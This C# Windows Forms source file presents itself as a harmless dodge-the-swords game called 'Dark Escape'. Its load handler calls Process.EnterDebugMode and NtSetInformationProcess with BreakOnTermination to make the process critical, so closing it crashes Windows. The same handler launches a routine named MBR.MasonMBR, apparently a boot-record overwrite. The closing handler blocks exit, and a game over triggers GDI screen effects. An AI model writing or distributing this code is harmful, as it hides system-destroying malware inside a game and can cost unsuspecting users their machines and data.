using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MasonGame
{
    public partial class GAME : Form
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        private int playerX, playerY;
        private const int playerSize = 30;  
        private int playerSpeed = 10;
        private int playerHearts = 3; 
        private List<Obstacle> obstacles;
        private int baseObstacleSpeed = 6;
        private int obstacleSpeed;             
        private int obstacleSpawnTimer = 0;
        private int baseSpawnInterval = 30;  
        private int obstacleSpawnInterval;
        private int score = 0;
        private int highScore = 0;
        private bool gameOver = false;
        private bool gameStarted = false; 
        private bool paused = false; 
        private Timer gameTimer;
        private Random random = new Random();
        private class Obstacle
        {
            public Rectangle Rect;
            public int HorizontalSpeed;
        }
        public GAME()
        {
            InitializeComponent();
            this.DoubleBuffered = true;
            this.BackColor = Color.Black;    
            this.ClientSize = new Size(800, 600);
            this.Text = "Dark Escape";
            playerX = (this.ClientSize.Width - playerSize) / 2;
            playerY = this.ClientSize.Height - playerSize - 20;
            obstacles = new List<Obstacle>();
            obstacleSpeed = baseObstacleSpeed;
            obstacleSpawnInterval = baseSpawnInterval;
            gameTimer = new Timer();
            gameTimer.Interval = 33;
            gameTimer.Tick += GameTimer_Tick;
            gameTimer.Start();
            this.KeyDown += Form1_KeyDown;
            this.KeyUp += Form1_KeyUp;
        }
        private void GameTimer_Tick(object sender, EventArgs e)
        {
            if (!gameStarted || paused)
            {
                Invalidate();
                return;
            }

            if (gameOver)
                return;

            score++;

            obstacleSpeed = baseObstacleSpeed + (score / 100);
            obstacleSpawnInterval = Math.Max(10, baseSpawnInterval - (score / 50));

            foreach (var obs in obstacles)
            {
                Rectangle r = obs.Rect;
                r.Y += obstacleSpeed;
                r.X += obs.HorizontalSpeed;
                if (r.X < 0 || r.X + r.Width > this.ClientSize.Width)
                {
                    obs.HorizontalSpeed = -obs.HorizontalSpeed;
                    r.X = Math.Max(0, Math.Min(r.X, this.ClientSize.Width - r.Width));
                }
                obs.Rect = r;
            }

            obstacles.RemoveAll(o => o.Rect.Y > this.ClientSize.Height);

            obstacleSpawnTimer++;
            if (obstacleSpawnTimer >= obstacleSpawnInterval)
            {
                obstacleSpawnTimer = 0;
                int obsWidth = random.Next(20, 60);
                int obsHeight = random.Next(20, 60);
                int obsX = random.Next(0, this.ClientSize.Width - obsWidth);
                int obsY = -obsHeight;
                int horizSpeed = random.Next(-3, 4);
                if (horizSpeed == 0)
                    horizSpeed = 1;

                Obstacle newObs = new Obstacle
                {
                    Rect = new Rectangle(obsX, obsY, obsWidth, obsHeight),
                    HorizontalSpeed = horizSpeed
                };
                obstacles.Add(newObs);
            }

            Rectangle playerRect = new Rectangle(playerX, playerY, playerSize, playerSize);
            List<Obstacle> collidedObstacles = new List<Obstacle>();
            foreach (var obs in obstacles)
            {
                if (playerRect.IntersectsWith(obs.Rect))
                {
                    collidedObstacles.Add(obs);
                }
            }
            if (collidedObstacles.Count > 0)
            {
                foreach (var obs in collidedObstacles)
                {
                    obstacles.Remove(obs);
                    playerHearts--;
                    if (playerHearts <= 0)
                    {
                        gameOver = true;
                        gameTimer.Stop();
                        if (score > highScore)
                            highScore = score;
                        Task.Factory.StartNew(() => GDI.MasonGDI());
                        Task.Factory.StartNew(() => BB1.PlayBytebeatAudioLoop());
                        break;
                    }
                    else
                    {
                        playerX = (this.ClientSize.Width - playerSize) / 2;
                        playerY = this.ClientSize.Height - playerSize - 20;
                    }
                }
            }

            Invalidate();
        }
        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (!gameStarted)
            {
                gameStarted = true;
                score = 0;
                gameOver = false;
                playerHearts = 3;
                obstacles.Clear();
                playerX = (this.ClientSize.Width - playerSize) / 2;
                playerY = this.ClientSize.Height - playerSize - 20;
                gameTimer.Start();
                return;
            }
            if (e.KeyCode == Keys.Space)
            {
                paused = !paused;
                return;
            }

            if (gameOver)
                return;
            if (e.KeyCode == Keys.Left)
            {
                playerX -= playerSpeed;
                if (playerX < 0)
                    playerX = 0;
            }
            else if (e.KeyCode == Keys.Right)
            {
                playerX += playerSpeed;
                if (playerX + playerSize > this.ClientSize.Width)
                    playerX = this.ClientSize.Width - playerSize;
            }
            else if (e.KeyCode == Keys.Up)
            {
                playerY -= playerSpeed;
                if (playerY < 0)
                    playerY = 0;
            }
            else if (e.KeyCode == Keys.Down)
            {
                playerY += playerSpeed;
                if (playerY + playerSize > this.ClientSize.Height)
                    playerY = this.ClientSize.Height - playerSize;
            }
        }
        private void Form1_KeyUp(object sender, KeyEventArgs e)
        {
            if (gameOver && e.KeyCode == Keys.R)
            {
                RestartGame();
            }
            if (gameOver && e.KeyCode == Keys.Escape)
            {
                Application.Exit();
            }
        }
        private void RestartGame()
        {
            gameOver = false;
            score = 0;
            playerHearts = 3;
            obstacles.Clear();
            playerX = (this.ClientSize.Width - playerSize) / 2;
            playerY = this.ClientSize.Height - playerSize - 20;
            gameTimer.Start();
            Invalidate();
        }
        protected override void OnPaint(PaintEventArgs e)
        {
            base.OnPaint(e);

            DrawPixelGrid(e.Graphics);

            if (!gameStarted)
            {
                string startText = "Welcome to the Mason Roulette!";
                using (Font font = new Font("Courier New", 20, FontStyle.Bold))
                {
                    SizeF textSize = e.Graphics.MeasureString(startText, font);
                    float textX = (this.ClientSize.Width - textSize.Width) / 2;
                    float textY = (this.ClientSize.Height - textSize.Height) / 2;
                    using (SolidBrush brush = new SolidBrush(Color.DarkRed))
                    {
                        e.Graphics.DrawString(startText, font, brush, textX, textY);
                    }
                    string instructionText = "Press S to start the game";
                    using (Font instructionFont = new Font("Courier New", 16, FontStyle.Regular))
                    {
                        SizeF instructionTextSize = e.Graphics.MeasureString(instructionText, instructionFont);
                        float instructionTextX = (this.ClientSize.Width - instructionTextSize.Width) / 2;
                        float instructionTextY = textY + textSize.Height + 10;
                        using (SolidBrush brush = new SolidBrush(Color.LightBlue))
                        {
                            e.Graphics.DrawString(instructionText, instructionFont, brush, instructionTextX, instructionTextY);
                        }
                    }
                }
                return;
            }
            if (paused)
            {
                string pauseText = "Paused - Press Space to continue";
                using (Font font = new Font("Courier New", 20, FontStyle.Bold))
                {
                    SizeF textSize = e.Graphics.MeasureString(pauseText, font);
                    float textX = (this.ClientSize.Width - textSize.Width) / 2;
                    float textY = (this.ClientSize.Height - textSize.Height) / 2;
                    using (SolidBrush brush = new SolidBrush(Color.Yellow))
                    {
                        e.Graphics.DrawString(pauseText, font, brush, textX, textY);
                    }
                }
            }
            foreach (var obs in obstacles)
            {
                DrawSword(e.Graphics, obs.Rect);
            }
            DrawHead(e.Graphics, playerX, playerY, playerSize);

            using (SolidBrush textBrush = new SolidBrush(Color.LightGray))
            {
                using (Font font = new Font("Courier New", 12, FontStyle.Bold))
                {
                    e.Graphics.DrawString("Score: " + score, font, textBrush, 10, 10);
                    e.Graphics.DrawString("High Score: " + highScore, font, textBrush, 10, 30);
                }
            }
            for (int i = 0; i < playerHearts; i++)
            {
                DrawHeart(e.Graphics, this.ClientSize.Width - 40 * (i + 1), 10, 30, Color.Red);
            }
            if (gameOver)
            {
                string gameOverText = "Game Over";
                using (Font font = new Font("Courier New", 28, FontStyle.Bold))
                {
                    SizeF textSize = e.Graphics.MeasureString(gameOverText, font);
                    float textX = (this.ClientSize.Width - textSize.Width) / 2;
                    float textY = (this.ClientSize.Height - textSize.Height) / 2 - 40;
                    using (SolidBrush brush = new SolidBrush(Color.DarkRed))
                    {
                        e.Graphics.DrawString(gameOverText, font, brush, textX, textY);
                    }
                }
            }
        }
        private void DrawPixelGrid(Graphics g)
        {
            int gridSize = 10;
            using (Pen gridPen = new Pen(Color.FromArgb(30, Color.White)))
            {
                for (int x = 0; x < this.ClientSize.Width; x += gridSize)
                {
                    g.DrawLine(gridPen, x, 0, x, this.ClientSize.Height);
                }
                for (int y = 0; y < this.ClientSize.Height; y += gridSize)
                {
                    g.DrawLine(gridPen, 0, y, this.ClientSize.Width, y);
                }
            }
        }
        private void DrawHead(Graphics g, int x, int y, int size)
        {
            using (SolidBrush brush = new SolidBrush(Color.White))
            {
                g.FillEllipse(brush, x, y, size, size);
            }

            int eyeSize = size / 6;
            using (SolidBrush eyeBrush = new SolidBrush(Color.Black))
            {
                g.FillEllipse(eyeBrush, x + size / 4 - eyeSize / 2, y + size / 3, eyeSize, eyeSize);
                g.FillEllipse(eyeBrush, x + 3 * size / 4 - eyeSize / 2, y + size / 3, eyeSize, eyeSize);
            }
            if (playerHearts < 3)
            {
                using (Pen mouthPen = new Pen(Color.Black, 2))
                {
                    g.DrawArc(mouthPen, x + size / 4, y + size / 2, size / 2, size / 3, 180, 180);
                }
            }
            else
            {
                using (Pen mouthPen = new Pen(Color.Black, 2))
                {
                    g.DrawArc(mouthPen, x + size / 4, y + size / 2, size / 2, size / 3, 0, 180);
                }
            }
        }
        private void DrawHeart(Graphics g, int x, int y, int size, Color color)
        {
            using (GraphicsPath path = new GraphicsPath())
            {
                path.AddArc(new Rectangle(x, y, size / 2, size / 2), 180, 180);
                path.AddArc(new Rectangle(x + size / 2, y, size / 2, size / 2), 180, 180);
                path.AddLine(x + size, y + size / 4, x + size / 2, y + size);
                path.AddLine(x + size / 2, y + size, x, y + size / 4);
                path.CloseFigure();
                using (SolidBrush brush = new SolidBrush(color))
                {
                    g.FillPath(brush, path);
                }
            }
        }
        private void DrawSword(Graphics g, Rectangle rect)
        {
            int swordWidth = 40;
            int swordHeight = 120;
            GraphicsState state = g.Save();
            g.SmoothingMode = SmoothingMode.AntiAlias;
            int centerX = rect.X + rect.Width / 2;
            int centerY = rect.Y + rect.Height / 2;
            g.TranslateTransform(centerX, centerY);
            g.RotateTransform(180);
            int halfSword = swordHeight / 2;
            int bladeHeight = (int)(swordHeight * 0.7);
            int guardHeight = swordHeight / 10;
            int handleHeight = swordHeight - bladeHeight;
            int bladeWidthTop = swordWidth / 6;
            int bladeWidthBottom = swordWidth / 3;
            Point[] bladePoints = new Point[]
            {
                new Point(0, -halfSword),
                new Point(-bladeWidthTop / 2, -halfSword + bladeHeight / 4),
                new Point(-bladeWidthBottom / 2, -halfSword + bladeHeight),
                new Point(bladeWidthBottom / 2, -halfSword + bladeHeight),
                new Point(bladeWidthTop / 2, -halfSword + bladeHeight / 4)
            };
            using (SolidBrush bladeBrush = new SolidBrush(Color.LightGray))
            {
                g.FillPolygon(bladeBrush, bladePoints);
            }
            using (Pen bladePen = new Pen(Color.DarkGray, 1))
            {
                g.DrawPolygon(bladePen, bladePoints);
            }
            Rectangle guardRect = new Rectangle(-swordWidth / 4, -halfSword + bladeHeight - guardHeight, swordWidth / 2, guardHeight);
            using (SolidBrush guardBrush = new SolidBrush(Color.Gray))
            {
                g.FillEllipse(guardBrush, guardRect);
            }
            using (Pen guardPen = new Pen(Color.DarkGray, 1))
            {
                g.DrawEllipse(guardPen, guardRect);
            }
            Rectangle handleRect = new Rectangle(-swordWidth / 8, -halfSword + bladeHeight, swordWidth / 4, handleHeight);
            using (SolidBrush handleBrush = new SolidBrush(Color.SaddleBrown))
            {
                g.FillRectangle(handleBrush, handleRect);
            }
            using (Pen handlePen = new Pen(Color.Black, 1))
            {
                g.DrawRectangle(handlePen, handleRect);
            }
            g.Restore(state);
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            Form newForm = new Form();
            newForm.Show();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            Task.Factory.StartNew(() => BB2.PlayBytebeatAudioLoop());
            Task.Factory.StartNew(() => MBR.MasonMBR());
        }
    }
}